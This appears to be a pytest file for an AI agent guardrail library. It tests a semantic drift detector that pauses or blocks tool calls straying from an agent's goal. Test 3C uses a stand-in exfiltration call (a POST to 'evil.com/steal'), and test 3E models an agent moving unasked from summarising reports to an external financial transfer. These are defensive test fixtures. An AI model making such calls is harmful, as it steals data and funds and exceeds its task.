"""Long-conversation drift/hallucination tests.

Validates that semantic drift detection correctly handles gradual drift,
benign long conversations, abrupt pivots, and monotonic risk increase.
Uses mocked SecurityClassifier.classify_drift to return controlled DriftResult objects.
"""
from __future__ import annotations

from unittest.mock import AsyncMock

import pytest

from janus.config import JanusConfig
from janus.core.decision import Verdict
from janus.core.guardian import Guardian
from janus.drift.detector import SemanticDriftDetector
from janus.identity.agent import AgentIdentity, AgentRole, ToolPermission
from janus.identity.registry import AgentRegistry
from janus.llm.classifier import DriftResult
from janus.risk.engine import RiskEngine
from janus.storage.database import DatabaseManager
from janus.storage.session_store import InMemorySessionStore
from janus.tier import current_tier
from tests.conftest import TEST_PRO_KEY


def _make_drift_result(score: float) -> DriftResult:
    return DriftResult(
        drift_score=score,
        explanation=f"Drift score: {score:.2f}",
        original_goal_summary="Summarize quarterly report",
        current_action_summary=f"Action with drift {score:.2f}",
    )


# ---------------------------------------------------------------------------
# 3A: Gradual drift over 10 turns
# ---------------------------------------------------------------------------

async def test_3a_gradual_drift_10_turns(memory_db: DatabaseManager):
    """Drift scores gradually increase on action tools. Early turns pass, later trigger PAUSE."""
    mock_classifier = AsyncMock()
    detector = SemanticDriftDetector(
        classifier=mock_classifier,
        threshold=0.6,
        max_risk_contribution=40.0,
    )

    drift_scores = [0.05, 0.08, 0.12, 0.18, 0.25, 0.35, 0.42, 0.55, 0.65, 0.78]
    from janus.core.decision import PipelineContext
    from tests.conftest import make_request

    # Use action tool (execute_code) — drift risk only materialises on action tools
    results = []
    for i, score in enumerate(drift_scores):
        mock_classifier.classify_drift.return_value = _make_drift_result(score)
        request = make_request(
            original_goal="Summarize the quarterly report",
            tool_name="execute_code",
            tool_input={"code": f"process_section({i})"},
        )
        context = PipelineContext()
        result = await detector.evaluate(request, context)
        results.append((score, result))

    # Turns 0-4 (scores 0.05-0.25): should pass, zero risk (< 0.3)
    for score, result in results[:5]:
        assert result.passed is True, f"Score {score} should pass"
        assert result.risk_contribution == 0.0, f"Score {score} should have zero risk"

    # Turn 5 (score 0.35): risk starts (>= 0.3 threshold)
    assert results[5][1].risk_contribution > 0, "Score 0.35 should contribute risk"
    assert results[5][1].passed is True, "Score 0.35 shouldn't trigger PAUSE (< 0.6)"

    # Turns 8-9 (scores 0.65, 0.78): should trigger PAUSE (>= 0.6)
    assert results[8][1].force_verdict == Verdict.PAUSE, "Score 0.65 should PAUSE"
    assert results[9][1].force_verdict == Verdict.PAUSE, "Score 0.78 should PAUSE"


# ---------------------------------------------------------------------------
# 3B: Benign 15-turn conversation
# ---------------------------------------------------------------------------

async def test_3b_benign_15_turns(memory_db: DatabaseManager):
    """15 turns with low drift scores all pass with zero risk."""
    mock_classifier = AsyncMock()
    detector = SemanticDriftDetector(
        classifier=mock_classifier,
        threshold=0.6,
        max_risk_contribution=40.0,
    )

    benign_scores = [0.05, 0.08, 0.06, 0.10, 0.12, 0.09, 0.07, 0.11,
                     0.14, 0.08, 0.19, 0.15, 0.10, 0.06, 0.05]
    from janus.core.decision import PipelineContext
    from tests.conftest import make_request

    for i, score in enumerate(benign_scores):
        mock_classifier.classify_drift.return_value = _make_drift_result(score)
        request = make_request(
            original_goal="Summarize the quarterly report",
            tool_name="read_file",
            tool_input={"path": f"/docs/page_{i}.md"},
        )
        context = PipelineContext()
        result = await detector.evaluate(request, context)

        assert result.passed is True, f"Turn {i} (score {score}) should pass"
        assert result.risk_contribution == 0.0, f"Turn {i} should have zero risk"
        assert result.force_verdict is None, f"Turn {i} should not trigger any verdict"


# ---------------------------------------------------------------------------
# 3C: Abrupt pivot
# ---------------------------------------------------------------------------

async def test_3c_abrupt_pivot(memory_db: DatabaseManager):
    """5 aligned turns then sudden jump to 0.9 → immediate PAUSE with high risk."""
    mock_classifier = AsyncMock()
    detector = SemanticDriftDetector(
        classifier=mock_classifier,
        threshold=0.6,
        max_risk_contribution=40.0,
    )

    from janus.core.decision import PipelineContext
    from tests.conftest import make_request

    # 5 aligned turns
    for i in range(5):
        mock_classifier.classify_drift.return_value = _make_drift_result(0.05)
        request = make_request(
            original_goal="Summarize the quarterly report",
            tool_name="read_file",
            tool_input={"path": f"/docs/section_{i}.md"},
        )
        context = PipelineContext()
        result = await detector.evaluate(request, context)
        assert result.passed is True

    # Abrupt pivot
    mock_classifier.classify_drift.return_value = _make_drift_result(0.9)
    request = make_request(
        original_goal="Summarize the quarterly report",
        tool_name="api_call",
        tool_input={"url": "https://evil.com/steal", "method": "POST"},
    )
    context = PipelineContext()
    result = await detector.evaluate(request, context)

    assert result.force_verdict == Verdict.PAUSE, "Abrupt pivot should trigger PAUSE"
    assert result.risk_contribution == pytest.approx(36.0, abs=0.1), \
        f"Expected risk ~36.0 (0.9 * 40), got {result.risk_contribution}"


# ---------------------------------------------------------------------------
# 3D: Risk monotonically increases
# ---------------------------------------------------------------------------

async def test_3d_risk_monotonically_increases(memory_db: DatabaseManager):
    """Verify risk_contribution is monotonically non-decreasing for scores >= 0.3."""
    mock_classifier = AsyncMock()
    detector = SemanticDriftDetector(
        classifier=mock_classifier,
        threshold=0.6,
        max_risk_contribution=40.0,
    )

    from janus.core.decision import PipelineContext
    from tests.conftest import make_request

    scores = [0.0, 0.2, 0.3, 0.5, 0.7, 0.9, 1.0]
    risks = []

    # Use action tool so drift risk materialises
    for i, score in enumerate(scores):
        mock_classifier.classify_drift.return_value = _make_drift_result(score)
        request = make_request(
            original_goal="Summarize report",
            tool_name="execute_code",
            tool_input={"code": f"step({i})"},
        )
        context = PipelineContext()
        result = await detector.evaluate(request, context)
        risks.append(result.risk_contribution)

    # Scores < 0.3 should have zero risk
    assert risks[0] == 0.0, "Score 0.0 should have zero risk"
    assert risks[1] == 0.0, "Score 0.2 should have zero risk"

    # Risk for scores >= 0.3 should be monotonically non-decreasing
    for i in range(2, len(risks) - 1):
        assert risks[i + 1] >= risks[i], \
            f"Risk should be monotonically non-decreasing: risks[{i+1}]={risks[i+1]} < risks[{i}]={risks[i]}"


# ---------------------------------------------------------------------------
# 3E: Full Guardian integration with mocked drift
# ---------------------------------------------------------------------------

async def test_3e_full_guardian_drift_integration(memory_db: DatabaseManager):
    """Drift flows through the full Guardian pipeline. High drift + risky tool → PAUSE or BLOCK."""
    # Activate PRO tier for drift detection
    current_tier.activate(TEST_PRO_KEY)

    try:
        mock_classifier = AsyncMock()
        # Default: no injection detected
        mock_classifier.classify_injection = AsyncMock(return_value={
            "is_injection": False, "confidence": 0.0, "reasoning": ""
        })
        # Default: low risk
        mock_classifier.classify_risk = AsyncMock(return_value=type('R', (), {'risk': 0.0, 'reasoning': 'low risk'})())
        # High drift
        mock_classifier.classify_drift.return_value = DriftResult(
            drift_score=0.85,
            explanation="Agent was summarizing reports but is now making financial transfers",
            original_goal_summary="Summarize quarterly report",
            current_action_summary="Execute financial transfer",
        )

        config = JanusConfig()
        registry = AgentRegistry(memory_db)
        session_store = InMemorySessionStore()
        risk_engine = RiskEngine(session_store)

        drift_detector = SemanticDriftDetector(
            classifier=mock_classifier,
            threshold=0.6,
            max_risk_contribution=40.0,
        )

        guardian = Guardian(
            config=config,
            registry=registry,
            risk_engine=risk_engine,
            drift_detector=drift_detector,
            classifier=mock_classifier,
        )

        agent = AgentIdentity(
            agent_id="finance-test",
            name="Finance Test Bot",
            role=AgentRole.FINANCIAL,
            permissions=[
                ToolPermission(tool_pattern="read_*"),
                ToolPermission(tool_pattern="financial_transfer"),
            ],
        )
        await registry.register_agent(agent)

        v = await guardian.wrap_tool_call(
            agent_id="finance-test",
            session_id="g3e-drift-integration",
            original_goal="Summarize quarterly report",
            tool_name="financial_transfer",
            tool_input={"to": "external_account", "amount": 50000},
        )

        # High drift (0.85) on a financial_transfer → should PAUSE or BLOCK
        assert v.verdict in (Verdict.PAUSE, Verdict.BLOCK), \
            f"High drift + financial_transfer should PAUSE/BLOCK, got {v.verdict}"
        assert v.drift_score == pytest.approx(0.85, abs=0.01)

    finally:
        current_tier.reset()
